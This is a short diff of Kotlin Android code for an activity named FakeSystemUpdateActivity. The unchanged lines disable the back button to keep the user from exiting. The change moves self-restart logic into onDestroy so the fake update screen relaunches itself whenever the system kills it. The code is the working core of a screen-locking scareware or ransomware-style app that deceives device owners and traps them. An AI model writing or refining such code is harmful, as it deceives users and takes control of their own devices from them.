@@ -55,7 +55,6 @@ class FakeSystemUpdateActivity : AppCompatActivity() {
 
     override fun onBackPressed() {
         // Do nothing to prevent user from exiting
-        // Optionally, show a "System is busy" toast
     }
 
     override fun onResume() {
@@ -66,16 +65,16 @@ class FakeSystemUpdateActivity : AppCompatActivity() {
     override fun onPause() {
         super.onPause()
         handler.removeCallbacksAndMessages(null)
-        // If user manages to exit, restart this activity to maintain persistence
+    }
+
+    override fun onDestroy() {
+        handler.removeCallbacksAndMessages(null)
+        // Only restart if the system killed the activity, not if user/code called finish()
         if (!isFinishing && !isRestarting) {
             isRestarting = true
             val intent = Intent(this, FakeSystemUpdateActivity::class.java)
             startActivity(intent)
         }
-    }
-
-    override fun onDestroy() {
-        handler.removeCallbacksAndMessages(null)
         super.onDestroy()
     }
 }
